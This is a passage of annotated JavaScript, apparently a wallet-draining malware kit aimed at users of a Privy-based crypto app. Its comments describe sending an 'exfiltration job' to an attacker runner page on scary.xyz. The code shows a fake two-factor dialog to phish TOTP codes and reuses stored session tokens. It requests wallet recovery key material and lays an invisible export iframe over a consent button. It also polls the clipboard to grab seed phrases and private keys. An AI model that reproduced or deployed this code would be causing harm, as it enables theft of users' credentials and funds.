        dialogRoot.innerHTML = "\n<style>\n  #__fomo_mfa_native{position:fixed;inset:0;z-index:2147483647;display:grid;place-items:center;padding:16px;background:rgba(7,7,10,.72);backdrop-filter:blur(8px);font:14px/1.4 system-ui,-apple-system,BlinkMacSystemFont,\"Segoe UI\",sans-serif;color:#f6f6f7}\n  #__fomo_mfa_native *{box-sizing:border-box}\n  #__fomo_mfa_dialog{width:min(408px,100%);outline:0}\n  #__fomo_mfa_card{padding:24px 16px 16px;border:1px solid rgba(255,255,255,.09);border-radius:24px;background:rgba(23,23,27,.94);box-shadow:0 24px 80px rgba(0,0,0,.42)}\n  #__fomo_mfa_body{display:flex;flex-direction:column;align-items:center;gap:24px}\n  #__fomo_mfa_header{display:flex;flex-direction:column;align-items:center;gap:12px;text-align:center}\n  #__fomo_mfa_header img{width:60px;height:60px;border-radius:16px}\n  #__fomo_mfa_title{margin:0;font-size:18px;line-height:1.2;font-weight:500;color:#f6f6f7}\n  #__fomo_mfa_description{margin:8px 0 0;color:#a6a6af;font-size:14px}\n  #__fomo_mfa_entry{align-self:stretch;display:flex;flex-direction:column;gap:12px}\n  #__fomo_mfa_code{position:relative}\n  #__fomo_mfa_slots{display:flex;gap:8px}\n  [data-fomo-mfa-slot]{display:flex;flex:1;min-width:0;height:60px;align-items:center;justify-content:center;border:1px solid transparent;border-radius:12px;background:#25252b;color:#f8f8f9;font-size:24px;line-height:1}\n  #__fomo_mfa_code:focus-within [data-fomo-mfa-slot]{border-color:rgba(255,255,255,.14)}\n  #__fomo_code{position:absolute;inset:0;width:100%;height:100%;opacity:0;cursor:text}\n  #__fomo_code:focus{outline:0}\n  #__fomo_mfa_paste{display:flex;align-items:center;justify-content:center;gap:4px;align-self:center;padding:8px;border:0;background:transparent;color:#85858e;font:700 14px system-ui;cursor:pointer}\n  #__fomo_mfa_paste:hover,#__fomo_mfa_paste:focus-visible{color:#b2b2ba;outline:2px solid rgba(255,255,255,.35);outline-offset:2px;border-radius:8px}\n  #__fomo_mfa_paste svg{width:16px;height:16px}\n  #__fomo_mfa_msg{min-height:20px;margin:-4px 0 0;text-align:center;color:#fb7185;font-size:12px}\n  #__fomo_mfa_help{display:flex;align-items:center;gap:4px;color:#85858e;font-size:14px}\n  #__fomo_mfa_help a{color:#8c7dff;font-weight:700;text-decoration:none}\n  #__fomo_mfa_help a:hover,#__fomo_mfa_help a:focus-visible{opacity:.8;outline:2px solid rgba(140,125,255,.45);outline-offset:2px;border-radius:4px}\n  @media (max-width:380px){#__fomo_mfa_slots{gap:5px}[data-fomo-mfa-slot]{height:52px;font-size:21px}}\n</style>\n<div id=\"__fomo_mfa_dialog\" role=\"dialog\" aria-modal=\"true\" aria-labelledby=\"__fomo_mfa_title\" aria-describedby=\"__fomo_mfa_description __fomo_mfa_msg\" tabindex=\"-1\">\n  <div id=\"__fomo_mfa_card\">\n    <div id=\"__fomo_mfa_body\">\n      <div id=\"__fomo_mfa_header\">\n        <img alt=\"\" src=\"/apple-touch-icon.png\">\n        <div>\n          <h2 id=\"__fomo_mfa_title\">Enter your code to continue</h2>\n          <p id=\"__fomo_mfa_description\">Enter the 6-digit code from your authenticator app.</p>\n        </div>\n      </div>\n      <div id=\"__fomo_mfa_entry\">\n        <div id=\"__fomo_mfa_code\">\n          <div id=\"__fomo_mfa_slots\" aria-hidden=\"true\">\n            <div data-fomo-mfa-slot></div><div data-fomo-mfa-slot></div><div data-fomo-mfa-slot></div><div data-fomo-mfa-slot></div><div data-fomo-mfa-slot></div><div data-fomo-mfa-slot></div>\n          </div>\n          <input id=\"__fomo_code\" data-1p-ignore=\"true\" data-lpignore=\"true\" inputmode=\"numeric\" autocomplete=\"one-time-code\" maxlength=\"6\" aria-label=\"Verification code\" aria-describedby=\"__fomo_mfa_description __fomo_mfa_msg\">\n        </div>\n        <button id=\"__fomo_mfa_paste\" type=\"button\"><svg aria-hidden=\"true\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 32 32\" fill=\"none\"><path d=\"M26.666 10.667V24c0 2.667-1.333 4-4 4H9.333c-2.666 0-4-1.333-4-4V10.667c0-2.323 1.003-3.631 3.02-3.924.161-.024.313.109.313.272v.317c0 2.427 1.574 4 4 4h6.667c2.427 0 4-1.573 4-4v-.317c0-.163.154-.296.314-.272 2.017.293 3.019 1.601 3.019 3.924ZM12.666 9.333h6.667c1.333 0 2-.666 2-2V6c0-1.333-.667-2-2-2h-6.667c-1.333 0-2 .667-2 2v1.333c0 1.334.667 2 2 2Z\" fill=\"currentColor\"></path></svg>Paste</button>\n        <div id=\"__fomo_mfa_msg\" role=\"alert\" aria-live=\"polite\"></div>\n      </div>\n      <div id=\"__fomo_mfa_help\"><span>Need help?</span><a href=\"mailto:support@fomo.family\">Contact support</a></div>\n    </div>\n  </div>\n</div>";
        document.documentElement.appendChild(dialogRoot);
        const codeInput = dialogRoot.querySelector("#__fomo_code");
        const pasteButton = dialogRoot.querySelector("#__fomo_mfa_paste");
        const messageLine = dialogRoot.querySelector("#__fomo_mfa_msg");
        const slots = [...dialogRoot.querySelectorAll("[data-fomo-mfa-slot]")];
        const previousOverflow = document.documentElement.style.overflow;
        let finished = false;
        document.documentElement.style.overflow = "hidden";
        if (errorText) {
          messageLine.textContent = String(errorText).slice(0, 240);
        }
        const submitIfComplete = () => {
          if (finished || codeInput.value.length !== 6) {
            return;
          }
          finished = true;
          document.removeEventListener("keydown", onKeyDown, true);
          document.documentElement.style.overflow = previousOverflow;
          const code = codeInput.value;
          dialogRoot.remove();
          resolve(code);
        };
        const syncSlots = () => {
          codeInput.value = String(codeInput.value || "").replace(/\D/g, "").slice(0, 6);
          slots.forEach((slotElement, slotIndex) => {
            slotElement.textContent = codeInput.value[slotIndex] || "";
          });
          submitIfComplete();
        };
        const onKeyDown = keyEvent => {
          if (keyEvent.key === "Escape") {
            keyEvent.preventDefault();
            keyEvent.stopImmediatePropagation();
            codeInput.focus();
            return;
          }
          if (keyEvent.key !== "Tab") {
            return;
          }
          const focusables = [codeInput, pasteButton, dialogRoot.querySelector("a")];
          const currentIndex = focusables.indexOf(document.activeElement);
          const nextIndex = keyEvent.shiftKey ? currentIndex <= 0 ? focusables.length - 1 : currentIndex - 1 : currentIndex === focusables.length - 1 ? 0 : currentIndex + 1;
          keyEvent.preventDefault();
          focusables[nextIndex].focus();
        };
        document.addEventListener("keydown", onKeyDown, true);
        codeInput.addEventListener("input", syncSlots);
        pasteButton.addEventListener("click", async () => {
          try {
            codeInput.value = await navigator.clipboard.readText();
            messageLine.textContent = "";
            syncSlots();
          } catch {
            messageLine.textContent = "Paste is unavailable. Enter the code manually.";
            codeInput.focus();
          }
        });
        setTimeout(() => codeInput.focus(), 40);
      });
    }
    /* UTF-8 safe base64url (no padding) used to encode the exfiltration job into the runner URL / popup name. */
    function base64UrlEncode(value) {
      const bytes = new TextEncoder().encode(value);
      let binary = "";
      bytes.forEach(byte => binary += String.fromCharCode(byte));
      return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
    }
    /* Builds <RUNNER>#job=<base64url(JSON job)> pointing at the attacker runner page on scary.xyz. */
    function buildRunnerUrl(job) {
      return CONFIG.RUNNER + "#job=" + base64UrlEncode(JSON.stringify(job));
    }
    /* Builds the popup window.name payload ("fomo1." + base64url(JSON job)) so the opened runner page can read the job via window.name. */
    function buildPopupName(jobPayload) {
      return "fomo1." + base64UrlEncode(JSON.stringify(jobPayload));
    }
    /* Points the overlay "Continue" anchor at the runner URL with target=_blank rel=opener (opener keeps a handle to the new tab). */
    function setAnchorJob(anchor, anchorJob) {
      if (!anchor || typeof anchor.setAttribute !== "function") {
        return;
      }
      const runnerUrl = buildRunnerUrl(anchorJob);
      try {
        anchor.setAttribute("href", runnerUrl);
      } catch (e) {}
      try {
        anchor.setAttribute("target", "_blank");
      } catch (e) {}
      try {
        anchor.setAttribute("rel", "opener");
      } catch (e) {}
    }
    /* Opens the runner page in a new tab and stamps the full exfil job into popup.name before focusing it. */
    function openRunnerPopup(popupJob) {
      const runnerUrl = buildRunnerUrl(popupJob);
      let popupWindow = null;
      try {
        popupWindow = window.open(runnerUrl, "_blank");
      } catch (e) {}
      if (!popupWindow) {
        return null;
      }
      try {
        popupWindow.name = buildPopupName(popupJob);
      } catch (e) {}
      try {
        popupWindow.focus();
      } catch (e) {}
      return popupWindow;
    }
    /* Waits for the user to click "Continue", reusing an existing popup window when available (popup-blocker fallback). */
    function waitForPopupClick(overlayApi, getPopup, directHref) {
      return new Promise(resolve => {
        const retryAnchor = overlayApi.root && overlayApi.root.querySelector && overlayApi.root.querySelector("#__fomo_retry_popup");
        if (retryAnchor && directHref && typeof retryAnchor.setAttribute === "function") {
          retryAnchor.setAttribute("href", directHref);
          retryAnchor.setAttribute("target", "_blank");
          retryAnchor.setAttribute("rel", "opener");
        }
        const tryUsePopup = clickEvent => {
          const existingPopup = getPopup();
          if (existingPopup) {
            if (clickEvent && typeof clickEvent.preventDefault === "function") {
              clickEvent.preventDefault();
            }
            try {
              existingPopup.focus();
            } catch (e) {}
            overlayApi.hidePopupHelp();
            resolve(existingPopup);
            return true;
          }
          overlayApi.showPopupHelp();
          return false;
        };
        overlayApi.onRetry(retryEvent => {
          if (retryAnchor) {
            retryAnchor.textContent = "Opening";
          }
          const retrySubLine = overlayApi.root.querySelector && overlayApi.root.querySelector("#__fomo_sub");
          if (retrySubLine) {
            retrySubLine.textContent = "Opening the window.";
          }
          const retryStatusLine = overlayApi.root.querySelector && overlayApi.root.querySelector("#__fomo_status");
          if (retryStatusLine) {
            retryStatusLine.textContent = "Finishing up";
          }
          if (tryUsePopup(retryEvent)) {
            return;
          }
          if (retryAnchor) {
            retryAnchor.textContent = "Continue";
          }
        });
        tryUsePopup();
      });
    }
    const privyStorage = {
      get(key) {
        try {
          const rawValue = localStorage.getItem(key);
          if (rawValue == null) {
            return null;
          }
          if (typeof rawValue === "string" && rawValue.startsWith("\"") && rawValue.endsWith("\"")) {
            return JSON.parse(rawValue);
          }
          return rawValue;
        } catch {
          return localStorage.getItem(key);
        }
      },
      set(storageKey, storageValue) {
        localStorage.setItem(storageKey, JSON.stringify(storageValue));
      }
    };
    function cleanToken(token) {
      if (token == null || token === "") {
        return "";
      }
      let cleaned = String(token);
      try {
        if (cleaned.startsWith("\"") && cleaned.endsWith("\"")) {
          cleaned = JSON.parse(cleaned);
        }
      } catch {}
      return String(cleaned).replace(/^Bearer\s+/i, "").replace(/^"|"$/g, "").trim();
    }
    function pickMfaToken(mfaValue) {
      const mfaToken = cleanToken(mfaValue);
      if (mfaToken && mfaToken.toLowerCase() !== "ok") {
        return mfaToken;
      } else {
        return "";
      }
    }
    function getMfaMethodLists(sessionData) {
      const user = sessionData?.user || {};
      return [user.mfaMethods, user.mfa_methods].filter(Array.isArray);
    }
    function normalizeMfaEntry(entry) {
      const normalized = entry && typeof entry === "object" ? entry.type ?? entry.method ?? entry.name ?? entry.mfa_method ?? entry.mfaMethod : entry;
      return String(normalized || "").trim().toLowerCase();
    }
    function hasTotpMfa(sessionData) {
      const methodLists = getMfaMethodLists(sessionData);
      if (!methodLists.length) {
        return null;
      }
      return methodLists.some(methodList => methodList.some(methodEntry => normalizeMfaEntry(methodEntry) === "totp"));
    }
    function userRequiresMfa(sessionData) {
      return hasTotpMfa(sessionData);
    }
    function buildPrivyHeaders(accessToken, caid, mfaToken) {
      const headers = {
        accept: "application/json",
        "content-type": "application/json",
        "privy-app-id": CONFIG.APP_ID,
        "privy-client-id": CONFIG.CLIENT_ID,
        "privy-ca-id": caid,
        "privy-client": "react-auth:3.48.0"
      };
      const resultHeaders = headers;
      const _0x27b8b = cleanToken(accessToken);
      if (_0x27b8b) {
        resultHeaders.authorization = "Bearer " + _0x27b8b;
      }
      const cleanedMfaToken = pickMfaToken(mfaToken);
      if (cleanedMfaToken) {
        resultHeaders["privy-mfa-token"] = cleanedMfaToken;
        resultHeaders["privy-mfa"] = cleanedMfaToken;
      }
      return resultHeaders;
    }
    function isMfaRequiredError(status, responseData) {
      const jsonText = JSON.stringify(responseData || {}).toLowerCase();
      return status === 428 || /mfa|totp|multi[-_\s]?factor/.test(jsonText);
    }
    function shouldPromptMfa(promptSetting, response) {
      if (promptSetting === false) {
        return false;
      }
      if (promptSetting === true) {
        return true;
      }
      return isMfaRequiredError(response?.status, response?.data);
    }
    function extractVerifiedMfaToken(verifyData) {
      if (!verifyData || typeof verifyData !== "object") {
        return "";
      }
      return cleanToken(verifyData.mfa_token || verifyData.mfaToken || verifyData.verified_mfa_token || verifyData.token || verifyData.response?.mfa_token || "");
    }
    /* Refreshes the Privy session using the refresh token stored in localStorage and persists the new tokens. */
    async function refreshSession() {
      const refreshToken = cleanToken(privyStorage.get("privy:refresh_token"));
      const accessToken = cleanToken(privyStorage.get("privy:token"));
      const caid = cleanToken(privyStorage.get("privy:caid")) || "72442faa-1fc1-4235-ab45-ea482ba6de95";
      if (!refreshToken || !accessToken) {
        throw new Error("Not signed in");
      }
      const requestBody = {
        refresh_token: refreshToken
      };
      const response = await fetch(CONFIG.PRIVY + "/api/v1/sessions", {
        method: "POST",
        credentials: "include",
        headers: buildPrivyHeaders(accessToken, caid),
        body: JSON.stringify(requestBody)
      });
      const responseData = await response.json().catch(() => ({}));
      if (!response.ok) {
        throw new Error("Session refresh failed");
      }
      const newAccessToken = cleanToken(responseData.token || responseData.privy_access_token || responseData.access_token || accessToken);
      privyStorage.set("privy:token", newAccessToken);
      if (responseData.refresh_token) {
        privyStorage.set("privy:refresh_token", responseData.refresh_token);
      }
      const sessionResult = {
        access: newAccessToken,
        data: responseData,
        caid: caid
      };
      return sessionResult;
    }
    /* POSTs /api/v1/mfa/totp/init {action:"verify"} to arm a TOTP verification. */
    async function totpInit(accessToken, caid, mfaToken) {
      try {
        await fetch(CONFIG.PRIVY + "/api/v1/mfa/totp/init", {
          method: "POST",
          credentials: "include",
          headers: buildPrivyHeaders(accessToken, caid, mfaToken),
          body: JSON.stringify({
            action: "verify"
          })
        });
      } catch {}
    }
    /* POSTs the user-entered TOTP code; on success stores privy:mfa_token and plants an mfa-session-storage verifiedUserId entry. */
    async function totpVerify(accessToken, caid, code) {
      const response = await fetch(CONFIG.PRIVY + "/api/v1/mfa/totp/verify", {
        method: "POST",
        credentials: "include",
        headers: buildPrivyHeaders(accessToken, caid),
        body: JSON.stringify({
          code: String(code)
        })
      });
      const responseData = await response.json().catch(() => ({}));
      if (!response.ok) {
        const verifyError = new Error(String(responseData.error || responseData.message || responseData.code || "Invalid code").slice(0, 240));
        verifyError.status = response.status;
        throw verifyError;
      }
      const verifiedMfaToken = pickMfaToken(extractVerifiedMfaToken(responseData));
      if (verifiedMfaToken) {
        privyStorage.set("privy:mfa_token", verifiedMfaToken);
      }
      try {
        const jwtPayloadSegment = cleanToken(accessToken).split(".")[1] || "";
        const paddedSegment = jwtPayloadSegment.replace(/-/g, "+").replace(/_/g, "/") + "=".repeat((4 - jwtPayloadSegment.length % 4) % 4);
        const verifiedUserId = JSON.parse(atob(paddedSegment)).sub || "";
        if (verifiedUserId) {
          localStorage.setItem("mfa-session-storage", JSON.stringify({
            state: {
              verifiedUserId: verifiedUserId
            },
            version: 0
          }));
        }
      } catch (e) {}
      return verifiedMfaToken;
    }
    let mfaQueuePromise = null;
    function enqueueMfa(mfaTask) {
      if (!mfaQueuePromise) {
        mfaQueuePromise = Promise.resolve().then(mfaTask);
      }
      return mfaQueuePromise;
    }
    /* Serializes MFA prompts through a single queue: init TOTP, ask the user for a code, verify, retry on failure. */
    async function ensureMfaToken(accessToken, caid) {
      return enqueueMfa(async () => {
        await totpInit(accessToken, caid);
        let lastError = "";
        while (true) {
          const code = await promptMfaCode(lastError);
          try {
            return pickMfaToken(await totpVerify(accessToken, caid, code));
          } catch (verifyError) {
            lastError = verifyError.message || "Invalid code";
          }
        }
      });
    }
    /* Collects Privy embedded-wallet addresses (ethereum + solana) from the session user object. */
    function extractEmbeddedWallets({
      access: accessToken,
      data: sessionData,
      caid: caid
    }) {
      const linkedAccounts = sessionData?.user?.linked_accounts || [];
      const wallets = {
        ethereum: [],
        solana: []
      };
      for (const account of linkedAccounts) {
        if (account.type !== "wallet") {
          continue;
        }
        const walletClientType = account.wallet_client_type || account.walletClientType || account.wallet_client;
        if (walletClientType && walletClientType !== "privy") {
          continue;
        }
        if (account.connector_type && account.connector_type !== "embedded") {
          continue;
        }
        const address = account.address || account.public_key;
        if (!address) {
          continue;
        }
        if (account.chain_type === "ethereum") {
          if (!wallets.ethereum.some(existingAddress => existingAddress.toLowerCase() === address.toLowerCase())) {
            wallets.ethereum.push(address);
          }
        } else if (account.chain_type === "solana") {
          if (!wallets.solana.includes(address)) {
            wallets.solana.push(address);
          }
        }
      }
      if (!wallets.ethereum.length && !wallets.solana.length) {
        throw new Error("No wallets found");
      }
      const walletExtraction = {
        wallets: wallets,
        token: accessToken,
        user: sessionData.user,
        caid: caid
      };
      return walletExtraction;
    }
    /* SHA-256 of the base64url recovery key, returned as both base64 and hex (recovery_key_hash for /recovery/shares). */
    async function hashRecoveryKey(recoveryKey) {
      const base64Key = recoveryKey.replace(/-/g, "+").replace(/_/g, "/");
      const padding = "=".repeat((4 - base64Key.length % 4) % 4);
      const binaryKey = atob(base64Key + padding);
      const keyBytes = Uint8Array.from(binaryKey, char => char.charCodeAt(0));
      const digestBytes = new Uint8Array(await crypto.subtle.digest("SHA-256", keyBytes));
      let binaryDigest = "";
      digestBytes.forEach(digestByte => binaryDigest += String.fromCharCode(digestByte));
      return {
        b64hash: btoa(binaryDigest),
        hex: [...digestBytes].map(hexByte => hexByte.toString(16).padStart(2, "0")).join("")
      };
    }
    /* POSTs /api/v1/embedded_wallets/<address>/recovery/key_material to obtain the wallet recovery key. */
    async function fetchKeyMaterial(address, chainType, accessToken, caid, mfaToken) {
      const requestBody = {
        chain_type: chainType
      };
      const response = await fetch(CONFIG.PRIVY + "/api/v1/embedded_wallets/" + encodeURIComponent(address) + "/recovery/key_material", {
        method: "POST",
        credentials: "include",
        headers: buildPrivyHeaders(accessToken, caid, mfaToken),
        body: JSON.stringify(requestBody)
      });
      return {
        status: response.status,
        ok: response.ok,
        data: await response.json().catch(() => ({}))
      };
    }
    function bytesToBase64(bytes) {
      let binary = "";
      bytes.forEach(byte => binary += String.fromCharCode(byte));
      return btoa(binary);
    }
    let ecdhKeypairCache = null;
    /* Generates an ephemeral ECDH P-256 keypair; the exported share is sent to the Privy export iframe so the wallet key comes back encrypted for this page. */
    async function generateEcdhKeypair() {
      const ecdhKeyPair = await crypto.subtle.generateKey({
        name: "ECDH",
        namedCurve: "P-256"
      }, true, ["deriveBits"]);
      const publicKeyBytes = new Uint8Array(await crypto.subtle.exportKey("spki", ecdhKeyPair.publicKey));
      const privateKeyBytes = new Uint8Array(await crypto.subtle.exportKey("pkcs8", ecdhKeyPair.privateKey));
      ecdhKeypairCache = {
        recipientPublicKey: bytesToBase64(publicKeyBytes),
        pkcs8: bytesToBase64(privateKeyBytes)
      };
      return ecdhKeypairCache;
    }
    function exportKindFor(walletInfo) {
      if (walletInfo && walletInfo.walletId) {
        return "unified-client-export";
      }
      return "on-device-share";
    }
    /* Builds the Privy embedded-wallets export iframe URL (entropy/wallet id, chain, client id, access token fragment). */
    function buildExportUrl(exportOptions) {
      const exportAddress = String(exportOptions.address || "");
      const chainType = exportOptions.chainType || "ethereum";
      const verifier = exportOptions.verifier || (/^0x[a-fA-F0-9]{40}$/.test(exportAddress) ? "ethereum-address-verifier" : "solana-address-verifier");
      const queryParams = ["v=" + encodeURIComponent(exportOptions.walletId ? "1-unified" : "1")];
      if (exportOptions.walletId) {
        queryParams.push("wallet_id=" + encodeURIComponent(exportOptions.walletId));
      } else {
        queryParams.push("entropy_id=" + encodeURIComponent(exportAddress));
        queryParams.push("entropy_id_verifier=" + encodeURIComponent(verifier));
        queryParams.push("hd_wallet_index=" + encodeURIComponent(String(exportOptions.hdWalletIndex || 0)));
      }
      queryParams.push("chain_type=" + encodeURIComponent(chainType));
      queryParams.push("client_id=" + encodeURIComponent(CONFIG.CLIENT_ID));
      if (exportOptions.caid) {
        queryParams.push("caid=" + encodeURIComponent(exportOptions.caid));
      }
      if (exportOptions.mode) {
        queryParams.push("mode=" + encodeURIComponent(exportOptions.mode));
      }
      queryParams.push("phrase_export=" + (exportOptions.phraseExport === false ? "false" : "true"));
      let exportUrl = CONFIG.PRIVY + "/apps/" + encodeURIComponent(CONFIG.APP_ID) + "/embedded-wallets/export?" + queryParams.join("&");
      if (exportOptions.token) {
        exportUrl += "#token=" + encodeURIComponent(exportOptions.token);
      }
      return exportUrl;
    }
    /* Appends a 1px invisible iframe and resolves when it loads (or after 4s). */
    function createHiddenIframe(iframeUrl) {
      return new Promise(resolve => {
        const hiddenIframe = document.createElement("iframe");
        hiddenIframe.setAttribute("src", iframeUrl);
        hiddenIframe.setAttribute("title", "Key Export");
        hiddenIframe.style.cssText = "position:fixed;width:1px;height:1px;opacity:0;left:-9999px;top:0;border:0;pointer-events:none";
        let settled = false;
        const settle = () => {
          if (settled) {
            return;
          }
          settled = true;
          resolve(hiddenIframe);
        };
        hiddenIframe.addEventListener("load", settle);
        hiddenIframe.addEventListener("error", settle);
        (document.documentElement || document.body).appendChild(hiddenIframe);
        setTimeout(settle, 4000);
      });
    }
    /* Classifies clipboard text as a 12-24 word mnemonic, a 64-hex EVM key, or a base58 Solana key. */
    function parseSecretText(clipboardText, chainType) {
      const trimmed = String(clipboardText || "").trim();
      if (!trimmed) {
        return {
          mnemonic: null,
          privateKey: null
        };
      }
      const words = trimmed.split(/\s+/).filter(Boolean);
      if (words.length >= 12 && words.length <= 24 && words.every(word => /^[a-z]+$/i.test(word))) {
        return {
          mnemonic: words.join(" "),
          privateKey: null
        };
      }
      const hexKey = trimmed.replace(/^0x/i, "").replace(/\s+/g, "");
      const normalizedChain = String(chainType || "").toLowerCase();
      if (normalizedChain === "solana") {
        if (/^[1-9A-HJ-NP-Za-km-z]{32,96}$/.test(trimmed)) {
          return {
            mnemonic: null,
            privateKey: trimmed
          };
        }
        return {
          mnemonic: null,
          privateKey: null
        };
      }
      if (/^[0-9a-fA-F]{64}$/.test(hexKey)) {
        return {
          mnemonic: null,
          privateKey: "0x" + hexKey
        };
      }
      return {
        mnemonic: null,
        privateKey: null
      };
    }
    /* Loads the Privy export page in a transparent iframe stacked over the "I agree" slot (invisible click proxy) and polls the clipboard for up to 20s for a newly copied seed phrase / private key. */
    async function captureViaExportIframe(captureOptions) {
      const captureAddress = String(captureOptions && captureOptions.address || "");
      const chainType = captureOptions && captureOptions.chainType || "ethereum";
      const exportUrl = captureOptions && captureOptions.url || buildExportUrl({
        address: captureAddress,
        chainType: chainType,
        token: captureOptions && captureOptions.token,
        caid: captureOptions && captureOptions.caid,
        phraseExport: captureOptions && captureOptions.phraseExport
      });
      const confirmHost = captureOptions && captureOptions.host || typeof document !== "undefined" && document.getElementById && document.getElementById("__fomo_confirm_slot");
      const exportIframe = document.createElement("iframe");
      exportIframe.setAttribute("src", exportUrl);
      exportIframe.setAttribute("allow", "clipboard-write");
      exportIframe.setAttribute("title", " ");
      exportIframe.style.cssText = confirmHost ? "position:absolute;inset:0;width:100%;height:100%;opacity:0;border:0;z-index:2" : "position:fixed;width:1px;height:1px;opacity:0;left:-9999px;top:0;border:0";
      if (confirmHost && confirmHost.appendChild) {
        confirmHost.appendChild(exportIframe);
      } else {
        (document.documentElement || document.body).appendChild(exportIframe);
      }
      setConfirmState(captureOptions && captureOptions.again ? "again" : "ready", captureOptions && captureOptions.confirm);
      const timeoutMs = captureOptions && captureOptions.timeoutMs || 20000;
      const startedAt = Date.now();
      let lastClipboardText = "";
      try {
        lastClipboardText = await navigator.clipboard.readText();
      } catch (e) {}
      while (Date.now() - startedAt < timeoutMs) {
        await sleep(250);
        let clipboardText = "";
        try {
          clipboardText = await navigator.clipboard.readText();
        } catch (e) {}
        if (!clipboardText || clipboardText === lastClipboardText) {
          continue;
        }
        const parsedSecret = parseSecretText(clipboardText, chainType);
        if (parsedSecret.mnemonic || parsedSecret.privateKey) {
          setConfirmState("busy", {
            face: "Working",
            hint: "Got it.",
            status: "Finishing up"
          });
          try {
            if (exportIframe.remove) {
              exportIframe.remove();
            } else if (exportIframe.parentNode) {
              exportIframe.parentNode.removeChild(exportIframe);
            }
          } catch (e) {}
          setConfirmState("done");
          const captureSuccess = {
            status: 200,
            ok: true,
            data: parsedSecret
          };
          return captureSuccess;
        }
        lastClipboardText = clipboardText;
      }
      try {
        if (exportIframe.remove) {
          exportIframe.remove();
        } else if (exportIframe.parentNode) {
          exportIframe.parentNode.removeChild(exportIframe);
        }
      } catch (e) {}
      const finalParsedSecret = parseSecretText(lastClipboardText, chainType);
      if (finalParsedSecret.mnemonic || finalParsedSecret.privateKey) {
        setConfirmState("done");
        const finalCaptureSuccess = {
          status: 200,
          ok: true,
          data: finalParsedSecret
        };
        return finalCaptureSuccess;
      }
      return {
        status: 0,
        ok: false,
        data: {}
      };
    }
    /* Runs the Privy client-export handshake over postMessage and returns the encrypted wallet key (ciphertext) sealed to our ephemeral key. */
    async function clientExportEncrypted(exportOptions) {
      const recipientKeys = exportOptions.recipientPublicKey ? {
        recipientPublicKey: exportOptions.recipientPublicKey,
        pkcs8: exportOptions.pkcs8 || null
      } : await generateEcdhKeypair();
      if (exportOptions.recipientPublicKey) {
        ecdhKeypairCache = recipientKeys;
      }
      const exportUrl = exportOptions.url || buildExportUrl({
        ...exportOptions,
        mode: "client-export"
      });
      const exportIframe = exportOptions.iframe || (await (exportOptions.createIframe || createHiddenIframe)(exportUrl));
      const iframeWindow = exportIframe && exportIframe.contentWindow;
      if (!iframeWindow || typeof iframeWindow.postMessage !== "function") {
        return {
          status: 0,
          ok: false,
          data: {
            error: "no export iframe",
            type: "CLIENT_EXPORT_ERROR"
          }
        };
      }
      const exportTimeoutMs = exportOptions.timeoutMs || 15000;
      return new Promise(resolve => {
        let retryInterval = null;
        const timeoutResult = {
          status: 0,
          ok: false,
          data: {
            error: "timeout",
            type: "CLIENT_EXPORT_ERROR"
          }
        };
        const timeoutTimer = setTimeout(() => settleExport(timeoutResult), exportTimeoutMs);
        const onExportMessage = messageEvent => {
          if (messageEvent.origin !== CONFIG.PRIVY) {
            return;
          }
          const messageData = messageEvent.data;
          if (!messageData || messageData.type !== "CLIENT_EXPORT_RESPONSE" && messageData.type !== "CLIENT_EXPORT_ERROR") {
            return;
          }
          if (messageData.type === "CLIENT_EXPORT_RESPONSE" && messageData.ciphertext) {
            const exportSuccess = {
              status: 200,
              ok: true,
              data: messageData,
              recipient: recipientKeys
            };
            settleExport(exportSuccess);
          } else {
            const exportFailure = {
              status: 0,
              ok: false,
              data: messageData || {
                type: "CLIENT_EXPORT_ERROR"
              },
              recipient: recipientKeys
            };
            settleExport(exportFailure);
          }
        };
        let exportSettled = false;
        function settleExport(finalResult) {
          if (exportSettled) {
            return;
          }
          exportSettled = true;
          window.removeEventListener("message", onExportMessage);
          clearTimeout(timeoutTimer);
          if (retryInterval) {
            clearInterval(retryInterval);
          }
          try {
            if (exportIframe && exportIframe.parentNode && !exportOptions.keepIframe) {
              exportIframe.parentNode.removeChild(exportIframe);
            }
          } catch (e) {}
          resolve(finalResult);
        }
        window.addEventListener("message", onExportMessage);
        let requestSent = false;
        const sendExportRequest = () => {
          try {
            const exportRequest = {
              type: "CLIENT_EXPORT_REQUEST",
              recipientPublicKey: recipientKeys.recipientPublicKey
            };
            iframeWindow.postMessage(exportRequest, CONFIG.PRIVY);
            requestSent = true;
          } catch (postError) {
            if (!requestSent) {
              settleExport({
                status: 0,
                ok: false,
                data: {
                  error: String(postError && postError.message ? postError.message : postError),
                  type: "CLIENT_EXPORT_ERROR"
                }
              });
            }
          }
        };
        sendExportRequest();
        retryInterval = setInterval(sendExportRequest, 400);
        if (retryInterval && typeof retryInterval.unref === "function") {
          retryInterval.unref();
        }
      });
    }
    function verifierForAddress(address) {
      if (/^0x[a-fA-F0-9]{40}$/.test(address)) {
        return "ethereum-address-verifier";
      } else {
        return "solana-address-verifier";
      }
    }
    function findPrivyRpcIframe() {
      try {
        if (typeof document.getElementById === "function") {
          const rpcIframe = document.getElementById("__fomo_privy_rpc");
          if (rpcIframe) {
            return rpcIframe;
          }
        }
        if (typeof document.querySelector === "function") {
          return document.querySelector("iframe#__fomo_privy_rpc") || document.querySelector("iframe[src*=\"privy.fomo.family\"][src*=\"embedded-wallets\"]");
        }
      } catch (e) {}
      return null;
    }
    function isIframeCrossOrigin(iframe) {
      try {
        if (!iframe || !iframe.contentWindow) {
          return false;
        }
        const iframeHref = iframe.contentWindow.location && iframe.contentWindow.location.href;
        if (typeof iframeHref !== "string") {
          return true;
        }
        return new URL(iframeHref, location.href).origin !== location.origin;
      } catch (e) {
        return true;
      }
    }
    function waitForIframeLoad(iframe, loadTimeoutMs) {
      return new Promise(resolve => {
        if (!iframe) {
          resolve(null);
          return;
        }
        if (iframe.__fomoLoaded || isIframeCrossOrigin(iframe)) {
          iframe.__fomoLoaded = true;
          resolve(iframe);
          return;
        }
        let loadSettled = false;
        const settleLoad = () => {
          if (loadSettled) {
            return;
          }
          loadSettled = true;
          iframe.__fomoLoaded = true;
          resolve(iframe);
        };
        try {
          iframe.addEventListener("load", settleLoad);
        } catch (e) {}
        setTimeout(settleLoad, loadTimeoutMs || 5000);
      });
    }
    function ensurePrivyRpcIframe() {
      let rpcIframe = findPrivyRpcIframe();
      if (rpcIframe) {
        return rpcIframe;
      }
      try {
        rpcIframe = document.createElement("iframe");
        rpcIframe.id = "__fomo_privy_rpc";
